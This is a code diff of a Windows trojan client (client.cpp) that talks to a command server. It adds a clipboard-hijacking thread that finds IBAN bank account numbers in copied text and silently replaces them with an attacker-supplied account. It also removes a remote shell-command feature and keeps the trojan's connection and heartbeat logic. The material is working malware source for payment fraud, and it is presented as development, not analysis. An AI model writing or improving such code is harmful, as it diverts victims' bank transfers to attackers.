@@ -1,4 +1,4 @@
-// client.cpp - Enhanced Trojan Client (victim)
+// client.cpp
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
@@ -10,6 +10,8 @@
 #include <ctime>
 #include <tlhelp32.h>
 #include <algorithm>
+#include <regex>
+#include <thread>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -28,6 +30,9 @@ enum CommandType {
     CMD_KEYLOG_START,    // Start keylogger (placeholder)
     CMD_KEYLOG_STOP,     // Stop keylogger (placeholder)
     CMD_PING,            // Simple ping/keep-alive
+    CMD_CLIPBOARD_START, // Start clipboard monitoring
+    CMD_CLIPBOARD_STOP,  // Stop clipboard monitoring
+    CMD_CLIPBOARD_STATUS,// Get clipboard monitor status
     CMD_UNKNOWN          // Unknown command
 };
 
@@ -45,9 +50,21 @@ std::string ListRunningProcesses();
 bool SendResponse(SOCKET clientSocket, const std::string& response);
 void LogActivity(const std::string& activity);
 
+// Clipboard monitoring functions
+DWORD WINAPI ClipboardMonitorThread(LPVOID lpParam);
+bool StartClipboardMonitoring();
+bool StopClipboardMonitoring();
+std::string GetClipboardMonitorStatus();
+
 // Global variables
 bool isRunning = true;
 std::string clientId;
+
+// Clipboard monitoring globals
+bool clipboardMonitorRunning = false;
+HANDLE hClipboardThread = NULL;
+std::string attackerAccountNumber = "PL12345678901234567890123456"; // Target account number to replace with
+std::string victimAccountNumber = ""; // Will be set from server command
 
 // Initialize Winsock
 bool InitializeWinsock() {
@@ -123,34 +140,17 @@ CommandType ParseCommand(const std::string& command) {
         return CMD_KEYLOG_START;
     } else if (command.substr(0, 10) == "KEYLOG_STOP") {
         return CMD_KEYLOG_STOP;
+    } else if (command.substr(0, 16) == "CLIPBOARD_START ") {
+        return CMD_CLIPBOARD_START;
+    } else if (command.substr(0, 14) == "CLIPBOARD_STOP") {
+        return CMD_CLIPBOARD_STOP; 
+    } else if (command.substr(0, 16) == "CLIPBOARD_STATUS") {
+        return CMD_CLIPBOARD_STATUS;
     } else if (command == "PING") {
         return CMD_PING;
     } else {
         return CMD_UNKNOWN;
     }
-}
-
-// Execute a shell command and return output
-std::string ExecuteShellCommand(const std::string& command) {
-    std::string cmd = command.substr(6); // Remove "SHELL " prefix
-    
-    // Create pipes for reading output
-    char buffer[128];
-    std::string result = "";
-    FILE* pipe = _popen(cmd.c_str(), "r");
-    
-    if (!pipe) {
-        return "Error executing command";
-    }
-    
-    // Read command output
-    while (!feof(pipe)) {
-        if (fgets(buffer, 128, pipe) != NULL)
-            result += buffer;
-    }
-    
-    _pclose(pipe);
-    return result;
 }
 
 // List files in a directory
@@ -263,32 +263,155 @@ std::string GetSystemInfo() {
     return ss.str();
 }
 
-// List running processes
-std::string ListRunningProcesses() {
+// Clipboard monitoring implementation
+DWORD WINAPI ClipboardMonitorThread(LPVOID lpParam) {
+    std::regex accountNumberPattern("\\b[A-Z]{2}\\d{24,34}\\b"); // Pattern for IBAN account numbers (e.g., PL12345678901234567890123456)
+    HWND hwnd = NULL;
+    
+    LogActivity("Clipboard monitoring started");
+    
+    // Try to find window handle for our process
+    DWORD currentPid = GetCurrentProcessId();
+    
+    // We need next clipboard viewer in sequence - using NULL means we're at end of chain
+    HWND hNextViewer = NULL;
+    
+    while (clipboardMonitorRunning) {
+        // Check if clipboard contains text
+        if (OpenClipboard(hwnd)) {
+            if (IsClipboardFormatAvailable(CF_TEXT)) {
+                HANDLE hData = GetClipboardData(CF_TEXT);
+                if (hData != NULL) {
+                    char* clipboardText = static_cast<char*>(GlobalLock(hData));
+                    if (clipboardText != NULL) {
+                        std::string text(clipboardText);
+                        GlobalUnlock(hData);
+                        
+                        // Check for account number pattern
+                        std::smatch matches;
+                        if (std::regex_search(text, matches, accountNumberPattern)) {
+                            std::string foundAccount = matches[0];
+                            
+                            // Log the detected account number
+                            LogActivity("Detected account number in clipboard: " + foundAccount);
+                            
+                            // IMPORTANT: Only replace if the found account number is NOT our attacker's account number
+                            // This prevents unnecessary clipboard updates when our number is already there
+                            if (foundAccount != attackerAccountNumber) {
+                                // Replace with attacker's account number if it's the victim's account
+                                // or if no specific victim account is set (replace any account)
+                                if (victimAccountNumber.empty() || foundAccount == victimAccountNumber) {
+                                    // Replace the account number
+                                    std::string newText = std::regex_replace(text, accountNumberPattern, attackerAccountNumber);
+                                    
+                                    // Prepare to update clipboard
+                                    HGLOBAL hNewData = GlobalAlloc(GMEM_MOVEABLE, newText.size() + 1);
+                                    if (hNewData != NULL) {
+                                        char* pNewText = static_cast<char*>(GlobalLock(hNewData));
+                                        if (pNewText != NULL) {
+                                            strcpy_s(pNewText, newText.size() + 1, newText.c_str());
+                                            GlobalUnlock(hNewData);
+                                            
+                                            // Empty clipboard and set new content
+                                            EmptyClipboard();
+                                            SetClipboardData(CF_TEXT, hNewData);
+                                            
+                                            LogActivity("Replaced account number with: " + attackerAccountNumber);
+                                        } else {
+                                            GlobalFree(hNewData);
+                                        }
+                                    }
+                                }
+                            } else {
+                                LogActivity("Skipping replacement - clipboard already contains attacker's account number");
+                            }
+                        }
+                    }
+                }
+            }
+            CloseClipboard();
+        }
+        
+        // Use a Windows message for clipboard updates instead of Sleep
+        // This will process any clipboard messages more efficiently
+        MSG msg;
+        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        
+        // Small sleep to prevent 100% CPU usage, but keep it responsive
+        Sleep(100); 
+    }
+    
+    LogActivity("Clipboard monitoring stopped");
+    return 0;
+}
+
+// Start clipboard monitoring
+bool StartClipboardMonitoring(const std::string& command) {
+    // Parse target account number if provided
+    if (command.length() > 16) { // "CLIPBOARD_START "
+        std::string params = command.substr(16);
+        
+        // Parse parameters (format: CLIPBOARD_START attacker_account [victim_account])
+        std::stringstream ss(params);
+        std::string attacker_acct, victim_acct;
+        
+        ss >> attacker_acct;
+        attackerAccountNumber = attacker_acct;
+        
+        if (ss >> victim_acct) {
+            victimAccountNumber = victim_acct;
+        } else {
+            victimAccountNumber = ""; // Will replace any account number found
+        }
+    }
+    
+    // Check if already running
+    if (clipboardMonitorRunning) {
+        return false;
+    }
+    
+    // Start the clipboard monitoring thread
+    clipboardMonitorRunning = true;
+    hClipboardThread = CreateThread(NULL, 0, ClipboardMonitorThread, NULL, 0, NULL);
+    
+    return (hClipboardThread != NULL);
+}
+
+// Stop clipboard monitoring
+bool StopClipboardMonitoring() {
+    if (!clipboardMonitorRunning) {
+        return false;
+    }
+    
+    clipboardMonitorRunning = false;
+    
+    // Wait for thread to terminate
+    if (hClipboardThread != NULL) {
+        WaitForSingleObject(hClipboardThread, 5000); // Wait up to 5 seconds
+        CloseHandle(hClipboardThread);
+        hClipboardThread = NULL;
+    }
+    
+    return true;
+}
+
+// Get clipboard monitor status
+std::string GetClipboardMonitorStatus() {
     std::stringstream ss;
-    ss << "===RUNNING PROCESSES===\n";
+    ss << "Clipboard monitoring: " << (clipboardMonitorRunning ? "ACTIVE" : "INACTIVE") << "\n";
     
-    // Take a snapshot of all processes
-    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        return "Error: Unable to create process snapshot";
+    if (clipboardMonitorRunning) {
+        ss << "Target account replacement: " << attackerAccountNumber << "\n";
+        if (!victimAccountNumber.empty()) {
+            ss << "Only replacing specific account: " << victimAccountNumber << "\n";
+        } else {
+            ss << "Replacing any detected account numbers\n";
+        }
     }
     
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-    
-    // Retrieve information about the first process
-    if (!Process32First(hProcessSnap, &pe32)) {
-        CloseHandle(hProcessSnap);
-        return "Error: Failed to get process information";
-    }
-    
-    // Walk through the snapshot of processes
-    do {
-        ss << "Process ID: " << pe32.th32ProcessID << "\tName: " << pe32.szExeFile << "\n";
-    } while (Process32Next(hProcessSnap, &pe32));
-    
-    CloseHandle(hProcessSnap);
     return ss.str();
 }
 
@@ -341,11 +464,7 @@ DWORD WINAPI ReceiveCommands(LPVOID lpParam) {
         std::string response;
         CommandType cmdType = ParseCommand(command);
         
-        switch (cmdType) {
-            case CMD_SHELL:
-                response = ExecuteShellCommand(command);
-                break;
-                
+        switch (cmdType) {   
             case CMD_SCREENSHOT:
                 response = "Screenshot functionality not implemented yet";
                 break;
@@ -362,16 +481,32 @@ DWORD WINAPI ReceiveCommands(LPVOID lpParam) {
                 response = GetSystemInfo();
                 break;
                 
-            case CMD_PROCESS_LIST:
-                response = ListRunningProcesses();
-                break;
-                
             case CMD_KEYLOG_START:
                 response = "Keylogger start functionality not implemented yet";
                 break;
                 
             case CMD_KEYLOG_STOP:
                 response = "Keylogger stop functionality not implemented yet";
+                break;
+                
+            case CMD_CLIPBOARD_START:
+                if (StartClipboardMonitoring(command)) {
+                    response = "Clipboard monitoring started successfully";
+                } else {
+                    response = "Failed to start clipboard monitoring or already running";
+                }
+                break;
+                
+            case CMD_CLIPBOARD_STOP:
+                if (StopClipboardMonitoring()) {
+                    response = "Clipboard monitoring stopped successfully";
+                } else {
+                    response = "Clipboard monitoring was not running";
+                }
+                break;
+                
+            case CMD_CLIPBOARD_STATUS:
+                response = GetClipboardMonitorStatus();
                 break;
                 
             case CMD_PING:
@@ -411,7 +546,6 @@ void CommunicateWithServer(SOCKET clientSocket) {
     }
     
     LogActivity("Connected with ID: " + clientId);
-    
     // Create thread to receive commands from server
     HANDLE hThread = CreateThread(NULL, 0, ReceiveCommands, &clientSocket, 0, NULL);
     if (hThread == NULL) {
@@ -421,7 +555,7 @@ void CommunicateWithServer(SOCKET clientSocket) {
     }
     
     // Main loop for status updates and keeping connection alive
-    int heartbeatInterval = 60; // in seconds
+    int heartbeatInterval = 500000; // in seconds
     while (isRunning) {
         // Send heartbeat every heartbeatInterval seconds
         if (!SendResponse(clientSocket, "HEARTBEAT:" + clientId)) {
@@ -454,8 +588,8 @@ void CleanupWinsock(SOCKET clientSocket) {
 // Attempt to connect to server with retry mechanism
 bool ConnectWithRetry(SOCKET& clientSocket) {
     int retryCount = 0;
-    const int maxRetries = 10;  // Maksymalna liczba prób połączenia
-    const int initialDelay = 5000;  // 5 sekund początkowego opóźnienia
+    const int maxRetries = 10;  // Maximum number of connection attempts
+    const int initialDelay = 5000;  // 5 seconds initial delay
     int currentDelay = initialDelay;
     
     while (retryCount < maxRetries) {
@@ -467,15 +601,15 @@ bool ConnectWithRetry(SOCKET& clientSocket) {
         }
         
         printf("Connection failed. Retrying in %d seconds...\n", currentDelay / 1000);
-        Sleep(currentDelay);  // Czekaj przed ponowną próbą
+        Sleep(currentDelay);  // Wait before next retry
         
-        // Zwiększ opóźnienie dla następnej próby (maksymalnie 30 sekund)
-        currentDelay = std::min(currentDelay * 2, 30000);
+        // Increase delay for next attempt (maximum 15 seconds)
+        currentDelay = std::min(currentDelay * 2, 15000);
         retryCount++;
     }
     
     printf("Failed to connect after %d attempts. Will try again in 60 seconds.\n", maxRetries);
-    Sleep(60000);  // Dłuższa przerwa po wyczerpaniu prób
+    Sleep(60000);  // Longer break after exhausting retry attempts
     return false;
 }
 
